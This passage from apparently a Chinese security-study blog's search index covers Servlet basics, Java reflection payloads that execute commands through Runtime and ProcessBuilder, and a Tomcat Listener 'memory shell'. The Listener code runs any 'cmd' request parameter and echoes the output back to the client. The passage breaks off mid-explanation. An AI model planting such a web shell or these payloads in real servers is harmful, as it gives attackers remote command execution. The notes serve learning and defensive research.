class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.write(<span class="string">&quot;&lt;h1&gt;Hello, dotast!&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在 web.xml 文件中配置 servlet 标签<br><img src="/2021/11/21/Servlet%E5%9F%BA%E7%A1%80/image-20221021114220068.png" alt="image-20221021114220068"></p><p>启动后访问定义好的<code>url-pattern</code><br><img src="/2021/11/21/Servlet%E5%9F%BA%E7%A1%80/image-20221021114304256.png" alt="image-20221021114304256"></p><h2 id="Request与Response"><a href="#Request与Response" class="headerlink" title="Request与Response"></a>Request与Response</h2><p>在前面我们编写的 Servlet 类中，<code>doGet()</code>方法传入了<code>HttpServletRequest</code>对象和<code>HttpServletResponse</code>对象<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ServletTest</span> <span class="keyword">extends</span> <span class="title class_">HttpServlet</span> &#123;</span><br><span class="line">    <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest req, HttpServletResponse resp)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line">        <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> resp.getWriter();</span><br><span class="line">        out.write(<span class="string">&quot;&lt;h1&gt;Hello, dotast!&lt;/h1&gt;&quot;</span>);</span><br><span class="line">        out.flush();</span><br><span class="line">        out.close();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p><code>HttpServletRequest</code>对象用于处理来自客户端的请求，当客户端通过HTTP协议访问服务器时，HTTP 中的所有信息都封装在这个对象中，通过<code>HttpServletRequest</code>对象可以获取到客户端请求的所有信息。</p><p><code>HttpServletResponse</code>对象用于响应客户端的请求，通过<code>HttpServletResponse</code>对象可以处理服务器端对客户端请求响应。</p><h3 id="HttpServletRequest常用方法"><a href="#HttpServletRequest常用方法" class="headerlink" title="HttpServletRequest常用方法"></a>HttpServletRequest常用方法</h3><div class="table-container"><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>getParameter(String name)</td><td>获取请求中的参数，该参数是由name指定的</td></tr><tr><td>getParameterValues(String name)</td><td>返回请求中的参数值，该参数值是由name指定的</td></tr><tr><td>getRealPath(String path)</td><td>获取Web资源目录</td></tr><tr><td>getAttribute(String name)</td><td>返回name指定的属性值</td></tr><tr><td>getAttributeNames()</td><td>返回当前请求的所有属性的名字集合</td></tr><tr><td>getCookies()</td><td>返回客户端发送的Cookie</td></tr><tr><td>getSession()</td><td>获取session回话对象</td></tr><tr><td>getInputStream()</td><td>获取请求主题的输入流</td></tr><tr><td>getReader()</td><td>获取请求主体的数据流</td></tr><tr><td>getMethod()</td><td>获取发送请求的方式，如GET、POST</td></tr><tr><td>getParameterNames()</td><td>获取请求中所有参数的名称</td></tr><tr><td>getRemoteAddr()</td><td>获取客户端的IP地址</td></tr><tr><td>getRemoteHost()</td><td>获取客户端名称</td></tr><tr><td>getServerPath()</td><td>获取请求的文件的路径</td></tr></tbody></table></div><h3 id="HttpServletResponse常用方法"><a href="#HttpServletResponse常用方法" class="headerlink" title="HttpServletResponse常用方法"></a>HttpServletResponse常用方法</h3><div class="table-container"><table><thead><tr><th>方法</th><th>说明</th></tr></thead><tbody><tr><td>getWriter()</td><td>获取响应打印流对象</td></tr><tr><td>getOutputStream()</td><td>获取响应流对象</td></tr><tr><td>addCookie(Cookie cookie)</td><td>将指定的Cookie加入到当前的响应中</td></tr><tr><td>addHeader(String name,String value)</td><td>将指定的名字和值加入到响应的头信息中</td></tr><tr><td>sendError(int sc)</td><td>使用指定状态码发送一个错误到客户端</td></tr><tr><td>sendRedirect(String location)</td><td>发送一个临时的响应到客户端</td></tr><tr><td>setDateHeader(String name,long date)</td><td>将给出的名字和日期设置响应的头部</td></tr><tr><td>setHeader(String name,String value)</td><td>将给出的名字和值设置响应的头部</td></tr><tr><td>setStatus(int sc)</td><td>给当前响应设置状态码</td></tr><tr><td>setContentType(String ContentType)</td><td>设置响应的MIME类型</td></tr></tbody></table></div>]]></content>
      
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java反射</title>
      <link href="/2021/11/21/%E5%8F%8D%E5%B0%84/"/>
      <url>/2021/11/21/%E5%8F%8D%E5%B0%84/</url>
      
        <content type="html"><![CDATA[<h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>反射是大多数语言都必不可少的组成部分，对象可以通过反射获取他的类，类可以通过反射拿到所有⽅法（包括私有），拿到的⽅法可以调⽤，总之通过“反射”，我们可以将 Java 这种静态语⾔附加上动态特性。</p></blockquote><p>在前面 JavaSE 学习的时候已经了解过反射的基本知识：<a href="../00-JavaSE/2-反射/反射.md">反射</a> ，所以这里开始学习在 Java安全中，反射可以给我们带来什么以及如何去利用。</p><h2 id="命令执行"><a href="#命令执行" class="headerlink" title="命令执行"></a>命令执行</h2><p>根据前面的学习，反射中的几个极为重要的利用方法：</p><p>获取 class 实例 之后</p><ul><li>获取类名：<code>forName()</code></li><li>创建对应类型的实例：<code>newInstance()</code></li><li>获取字段的值：<code>get()</code>、设置字段的值：<code>set()</code></li><li>获取方法：<code>getMethod()</code>、调用方法：<code>invoke()</code></li></ul><p><strong>我们如何通过反射去执行命令？</strong></p><p>最常见的情况就是调用<code>java.lang.Runtime</code>类，按照我们前面的学习，构造方式如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(aClass.newInstance(),<span class="string">&quot;whoami&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>但运行后报了错，报错原因是类的构造方法是私有的，而<code>newInstance()</code>只能调用 public 无参构造方法<br><img src="/2021/11/21/%E5%8F%8D%E5%B0%84/image-20220714174002665.png" alt="image-20220714174002665">查看手册，我们可以通过<code>getRuntime</code>来获取到当前的<code>Runtime</code>类对象<br><img src="/2021/11/21/%E5%8F%8D%E5%B0%84/image-20220714173931928.png" alt="image-20220714173931928"></p><p>因此构造 payload 如下<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(aClass.getMethod(<span class="string">&quot;getRuntime&quot;</span>).invoke(aClass),<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*变成一句话就是</span></span><br><span class="line"><span class="comment">Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;exec&quot;, String.class).invoke(Class.forName(&quot;java.lang.Runtime&quot;).getMethod(&quot;getRuntime&quot;).invoke(Class.forName(&quot;java.lang.Runtime&quot;)),&quot;&quot;);</span></span><br><span class="line"><span class="comment">*/</span></span><br></pre></td></tr></table></figure></p><p><img src="/2021/11/21/%E5%8F%8D%E5%B0%84/image-20220714174546983.png" alt="image-20220714174546983"></p><p>当然在前面的学习中，我们知道可以通过<code>getDeclaredConstructor()</code>去获取私有的构造方法，因此 payload 还可以构造成<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.lang.reflect.Constructor;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aClass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.Runtime&quot;</span>);</span><br><span class="line">        <span class="type">Constructor</span> <span class="variable">con</span> <span class="operator">=</span> aClass.getDeclaredConstructor();</span><br><span class="line">        con.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        aClass.getMethod(<span class="string">&quot;exec&quot;</span>, String.class).invoke(con.newInstance(),<span class="string">&quot;open /System/Applications/Calculator.app&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在《Java安全漫谈中》中，p牛提过：<u>如果一个类没有无参构造方法，也没有类似单例模式里的静态方法，我们怎样通过反射实例化该类呢？</u>的问题并给出了解决方案</p><p>我们采用<code>getConstructor</code>来替代<code>getMethod</code>，同时调用<code>java.lang.ProcessBuilder</code>类来执行命令。下面 payload 使用的是<code>ProcessBuilder</code>其中的一个构造函数<code>public ProcessBuilder(List&lt;String&gt; command)</code>，因此需要传入<code>List.class</code><br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Arrays;</span><br><span class="line"><span class="keyword">import</span> java.util.List;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Main</span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span><span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">aclass</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;java.lang.ProcessBuilder&quot;</span>);</span><br><span class="line">        aclass.getMethod(<span class="string">&quot;start&quot;</span>).invoke(aclass.getConstructor(List.class).</span><br><span class="line">                                         newInstance(Arrays.asList(<span class="string">&quot;open&quot;</span>,<span class="string">&quot;/System/Applications/Calculator.app&quot;</span>)));</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="/2021/11/21/%E5%8F%8D%E5%B0%84/image-20220714184847611.png" alt="image-20220714184847611"></p><h2 id="调用恶意类"><a href="#调用恶意类" class="headerlink" title="调用恶意类"></a>调用恶意类</h2><p>编写一个恶意类 evailClass<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">evailClass</span> &#123;</span><br><span class="line">    <span class="keyword">static</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;i am static&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用<code>Class.forName()</code>调用恶意类<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/10 10:45</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">testClass</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception&#123;</span><br><span class="line">        Class.forName(<span class="string">&quot;com.test.evailClass&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>运行后会成功执行恶意类中的<code>static&#123;&#125;</code>里的内容<br><img src="/2021/11/21/%E5%8F%8D%E5%B0%84/image-20221010112804706.png" alt="image-20221010112804706"></p>]]></content>
      
      
      
        <tags>
            
            <tag> Java基础 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Tomcat内存马之Listener</title>
      <link href="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/"/>
      <url>/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="Tomcat内存马之Listener"><a href="#Tomcat内存马之Listener" class="headerlink" title="Tomcat内存马之Listener"></a>Tomcat内存马之Listener</h1><h2 id="初识Tomcat内存马"><a href="#初识Tomcat内存马" class="headerlink" title="初识Tomcat内存马"></a>初识Tomcat内存马</h2><p>关于内存马，第一次接触是 PHP 的不死马，其原理是在内存中执行死循环，并删除自身文件，起到维持权限的作用，而 Tomcat 的内存马原理则与其不同。</p><p>在前面的学习我们知道，在 Java 程序中，HTTP 的请求会按照<code>Listener --&gt; Filter --&gt; Servlet</code>的顺序经过这三大组件，Tomcat 内存马则在请求的过程中修改程序本身的组件或者注册新的恶意组件到 Tomcat 服务器中，插入恶意代码，完成内存马的注入。</p><p>Tomcat 内存马技术的实现依赖于<code>Servlet 3.0</code>版本之后的动态注册组件，而 Tomcat 7.x 版本才开始支持<code>Servlet 3.0</code>。</p><h2 id="Tomcat基础知识"><a href="#Tomcat基础知识" class="headerlink" title="Tomcat基础知识"></a>Tomcat基础知识</h2><p>在学习 Java 内存马之前，我们得了解一些关于 Tomcat 的基础知识。</p><p>Tomcat 本身是由 Apache 软件基金会属下 Jakarta 开发的 Servlet 容器，目的是实现对 Servlet 和 JSP 的支持。其广为人知的是充当 Java 程序的 Web服务器，这是因为在 Tomcat 中内嵌了 HTTP 服务器。</p><p>Tomcat 对于 HTTP 请求的处理可以简化成如下图所示：<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221026123041907.png" alt="image-20221026123041907"></p><p>Tomcat 通过<code>Connector</code>组件接收并解析 HTTP 请求报文，创建<code>ServletRequest</code>对象发送给<code>Container</code>容器进行处理。<code>Container</code>容器处理完之后将响应封装成<code>ServletResponse</code>对象返回到<code>Connector</code>组件，<code>Connector</code>将其转换成 HTTP 响应报文返回到客户端，完成一次请求响应动作。</p><p>下面简单了解一下其中的组件和服务。</p><h3 id="Server"><a href="#Server" class="headerlink" title="Server"></a>Server</h3><p><code>Server</code>指代整个 Tomcat 服务器，主要提供接口让其他程序能访问到<code>Service</code>里面，同时维护它所包含的所有<code>Service</code>生命周期（初始化到服务结束等）。Tomcat 只存在一个<code>Server</code>，而<code>Server</code>中至少存在一个<code>Service</code>组件。</p><h3 id="Service"><a href="#Service" class="headerlink" title="Service"></a>Service</h3><p><code>Service</code>包含<code>Connector</code>、<code>Container</code>和其他若干组件，对外提供服务。一个<code>Service</code>可以设置多个<code>Connector</code>组件，但只能有一个<code>Container</code>容器。Tomcat 中<code>Service</code>接口的标准实现类是<code>StandardService</code>，该类还实现了<code>Lifecycle</code>接口用于控制下面组件的生命周期。</p><h3 id="Connector"><a href="#Connector" class="headerlink" title="Connector"></a>Connector</h3><p><code>Connector</code>组件是 Tomcat 中的核心组件之一，主要任务是接受客户端发送的 tcp 连接请求，创建 Request 和 Response 对象分别用于和请求端交换数据，接着生成线程用于处理这两个对象，最后转换成<code>ServletRequest</code>对象传递给<code>Container</code>容器。总结其功能如下：</p><ol><li>和客户端建立通信。</li><li>解析和处理应用层协议，将其封装成 Request 和 Response 对象，将 Request 对象转换成<code>ServletRequest</code>对象，传递给<code>Container</code>容器。</li><li>接收<code>Container</code>传递回来的<code>ServletResponse</code>对象，处理成 Response 对象，转换成 HTTP 响应报文返回到客户端。</li></ol><p>总结图如下所示：<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221026144545789.png" alt="image-20221026144545789"></p><p>从图中可以看到，<code>Connector</code>组件的工作由这三个子组件：<code>EndPoint</code>、<code>Processor</code>和<code>Adapter</code>共同完成，分别负责的功能如下：</p><ul><li><code>EndPoint</code>：负责网络通信，传递字节流到<code>Processor</code>。</li><li><code>Processor</code>：负责处理字节流生成 Tomcat Request 对象，传递到<code>Adapter</code>。</li><li><code>Adapter</code>：负责处理 Tomcat Request 对象，将其转换成<code>ServletRequest</code>。</li></ul><h3 id="Container"><a href="#Container" class="headerlink" title="Container"></a>Container</h3><p><code>Container</code>，别名为<code>Catalina</code>，用于处理<code>Connector</code>组件传递过来的<code>ServletRequest</code>请求。<code>Container</code>容器采用责任链的设计模式，含有四个子容器：<code>Engine</code>、<code>HOST</code>、<code>Context</code>和<code>Wrapper</code>。这四个子容器不是平行关系，而是父子关系，包含关系如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Engine &lt;-- Host &lt;-- Context &lt;-- Wrapper</span><br></pre></td></tr></table></figure><ul><li><code>Engine</code>：最顶层容器组件，包含多个<code>HOST</code>，实现类为<code>org.apache.catalina.core.StandardEngine</code>。</li><li><code>HOST</code>：代表一个虚拟主机，每个虚拟主机和对应域名进行匹配，包含多个<code>Context</code>，实现类为<code>org.apache.catalina.core.StandardHost</code>。</li><li><code>Context</code>：上下文容器，一个<code>Context</code>代表一个 WEB 应用，包含多个<code>Wrapper</code>，实现类为<code>org.apache.catalina.core.StandardContext</code>。</li><li><code>Wrapper</code>：一个<code>Wrapper</code>代表一个<code>Servlet</code>，是对<code>Servlet</code>的抽象包装。<code>Wrapper</code>负责管理<code>Servlrt</code>，包括<code>Servlet</code>的装载、初始化、执行和资源回收等，实习类为<code>org.apache.catalina.core.StandardWrapper</code>。</li></ul><p>示例图如下所示：<img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20210402150543076.png" alt="image-20210402150543076"></p><h2 id="Listener型内存马的实现"><a href="#Listener型内存马的实现" class="headerlink" title="Listener型内存马的实现"></a>Listener型内存马的实现</h2><p>在前面的 JavaWeb 基础学习时，我们了解了一些<code>Listener</code>监听器。在这其中，最适合作为内存马的监听器为<code>ServletRequestListener</code>，它用于监听 ServletRequest 对象的创建和销毁过程，因此当我们发起任意请求时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。</p><p>编写一个<code>ServletRequestListener</code>接口的实现类进行测试：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/25 10:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>访问任意路由都可以执行命令<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221028161656771.png" alt="image-20221028161656771"></p><p>不过这仅仅实现了未回显的命令执行，既然实现了命令执行，我们就得要做到回显。在 java 中，我们可以通过<code>request</code>类的<code>getResponse()</code>方法获取<code>response</code>对象<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221028115517545.png" alt="image-20221028115517545"></p><p>那么如何获取到<code>request</code>类呢？在<code>requestInitialized()</code>方法中预设给我们传入了<code>ServletRequestEvent</code>对象，我们跟进看看<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221028115757707.png" alt="image-20221028115757707"></p><p>这里存在一个<code>ServletRequest</code>类型的<code>request</code>字段，并且通过<code>getServletRequest()</code>方法可以拿到，而<code>servletRequestEvent</code>类可以转换成<code>HttpServletRequest</code>类型接口。</p><p><code>HttpServletRequest</code>类接口是继承<code>ServletRequest</code>接口，而<code>Request</code>类是<code>HttpServletRequest</code>接口的实现类。</p><p>因此我们可以通过反射拿到<code>ServletRequest</code>类中的<code>request</code>实例，然后经过强转类型获得<code>Request</code>对象类型<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.servlet.study;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Request;</span><br><span class="line"><span class="keyword">import</span> org.apache.catalina.connector.Response;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.InputStream;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Created by dotast on 2022/10/25 10:35</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ListenerTest</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">req</span> <span class="operator">=</span> (HttpServletRequest) servletRequestEvent.getServletRequest();</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> req.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span>(cmd != <span class="literal">null</span>)&#123;</span><br><span class="line">                <span class="type">Field</span> <span class="variable">field</span> <span class="operator">=</span> req.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">                field.setAccessible(<span class="literal">true</span>);</span><br><span class="line">                <span class="type">Request</span> <span class="variable">request</span> <span class="operator">=</span> (Request) field.get(req);</span><br><span class="line">                <span class="type">Response</span> <span class="variable">response</span> <span class="operator">=</span> request.getResponse();</span><br><span class="line">                <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> Runtime.getRuntime().exec(cmd).getInputStream();</span><br><span class="line">                <span class="type">ByteArrayOutputStream</span> <span class="variable">bao</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">                <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">1024</span>];</span><br><span class="line">                <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">                <span class="keyword">while</span>((a = inputStream.read(bytes))!=-<span class="number">1</span>)&#123;</span><br><span class="line">                    bao.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">                &#125;</span><br><span class="line">                response.getWriter().write(<span class="keyword">new</span> <span class="title class_">String</span>(bao.toByteArray()));</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent servletRequestEvent)</span> &#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>命令执行结果成功回显<img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221028160217726.png" alt="image-20221028160217726"></p><p>既然我们可以通过恶意的<code>ServletRequestListener</code>实现类触发命令执行，那么接下来就是考虑如何动态注册进服务器中的问题。</p><p>在<code>Runtime.getRuntime().exec()</code>打上断点，然后带上 cmd 参数执行一次弹出计算器看看调用栈<br><img src="/2021/11/10/Listener%E5%86%85%E5%AD%98%E9%A9%AC/image-20221027222247432.png" 